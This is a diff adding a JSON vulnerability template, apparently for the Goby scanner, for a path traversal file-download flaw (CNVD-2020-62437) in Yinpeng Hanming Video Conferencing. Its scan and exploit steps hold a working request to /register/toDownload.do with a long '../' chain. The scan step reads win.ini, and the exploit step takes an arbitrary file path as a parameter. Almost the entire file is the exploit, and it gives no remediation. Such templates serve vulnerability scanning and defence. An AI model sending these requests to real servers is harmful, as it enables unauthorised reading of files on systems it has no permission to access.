@@ -1,0 +1,99 @@
+{
+      "Name": "Yinpeng Hanming Video Conferencing Filedownload CNVD-2020-62437",
+      "Level": "1",
+      "Tags": [
+            "filedownload"
+      ],
+      "GobyQuery": "app=\"Hanming-Video-Conferencing\"",
+      "Description": "Shenzhen Yinpeng Cloud Computing Co., Ltd. was established on September 11, 2013. The company's business scope includes the development and sales of cloud computing technology, computer software, and hardware product design.",
+      "Product": "Yinpeng Hanming Video Conferencing",
+      "Homepage": "http://zhibo.hst.com/",
+      "Author": "",
+      "Impact": "Yinpeng Hanming Video Conferencing Filedownload CNVD-2020-62437",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2020-62437"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "File",
+                  "Type": "select",
+                  "Value": "windows/win.ini"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "fonts",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../{{{File}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "fonts",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
